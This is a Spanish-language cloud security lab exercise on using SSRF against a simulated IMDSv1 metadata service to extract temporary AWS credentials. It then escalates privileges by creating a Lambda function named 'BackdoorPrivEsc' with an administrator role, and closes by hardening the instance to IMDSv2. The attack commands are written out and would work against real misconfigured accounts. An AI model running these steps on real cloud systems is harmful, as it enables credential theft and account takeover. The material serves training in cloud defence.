## Laboratorio 1: Explotación del Plano de Identidad y Abuso de IMDSv1

* **Tema vinculado:** 3.1\. Paradigmas de seguridad en la nube y explotación de identidades.
* **Duración estimada:** 30 minutos.
* **Insumos iniciales:** Contenedor o VM simulada con una aplicación web vulnerable a SSRF y un servicio mock local en `169.254.169.254` que emula el servicio IMDSv1 de AWS/Azure/GCP.

### Objetivos de Aprendizaje

1. Explotar un vector SSRF para extraer credenciales temporales del servicio de metadatos de instancia bajo IMDSv1.
2. Encadenar permisos atómicos de IAM (`iam:PassRole` \+ `lambda:CreateFunction` o creación de políticas) para lograr escalada de privilegios en el plano de control.
3. Remediar la instancia forzando la transición a IMDSv2 con tokens orientados a sesión y límite de saltos.

### Guía Paso a Paso

#### Paso 1: Extracción de credenciales temporales vía SSRF (IMDSv1)
* Crea una estructura de directorios en tu estación de trabajo o máquina virtual:

```
mkdir -p cloud_ai_labs/recursos
cd cloud_ai_labs/recursos

```
* *Recurso Lab 1:* Emulador de Cómputo Vulnerable y Servicio IMDS (`imds_vulnerable_service.py`), este script en Flask emula de forma precisa el comportamiento del endpoint de metadatos `169.254.169.254` (soportando tanto el modo vulnerable IMDSv1 como el flujo orientado a sesión de IMDSv2) y sirve una aplicación web con una vulnerabilidad de SSRF en el puerto `8080`.
* Enviar una carga útil a la aplicación vulnerable para forzar una consulta `GET` no autenticada contra el servicio de metadatos local:

```
# Consulta indirecta a través de la vulnerabilidad SSRF en la app web
curl -s "http://localhost:8080/preview?url=[suspicious link removed]"

```

**Resultado esperado:** Un objeto JSON con `AccessKeyId`, `SecretAccessKey` y `Token` asociados al rol de la máquina.

#### Paso 2: Configuración de sesión y escalada de privilegios
Exportar las credenciales temporales y utiliza permisos preexistentes mal configurados para crear una función de ejecución con privilegios administrativos (`iam:PassRole`):

```
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Enumerar la propia identidad para verificar el contexto de ejecución
aws sts get-caller-identity

# Explotación de escalada: asociar un rol con privilegios elevados a una función
aws lambda create-function \
  --function-name BackdoorPrivEsc \
  --runtime python3.12 \
  --role arn:aws:iam::123456789012:role/AdministratorAccessRole \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://escalation_payload.zip

```

#### Paso 3: Remediación defensiva obligatoria (IMDSv2)
Para cerrar la brecha en la instancia y verificar la mitigación, se reconfigura el endpoint para forzar tokens de sesión e impedir peticiones directas:

```
# Forzar IMDSv2 y restringir saltos de red a 1
aws ec2 modify-instance-metadata-options \
  --instance-id i-0abcdef1234567890 \
  --http-tokens required \
  --http-put-response-hop-limit 1 \
  --http-endpoint enabled

```

*Comprobación:* Reintentar el `curl` del Paso 1 sin cabecera de sesión; el servicio debe retornar inmediatamente un código `401 Unauthorized`.

* **Entregable / Enlace con el Lab 2:** Archivo `audit_events.json` que contiene el volcado íntegro de registros de llamadas a la API generados durante esta actividad (CloudTrail / Azure Activity Logs simulados).
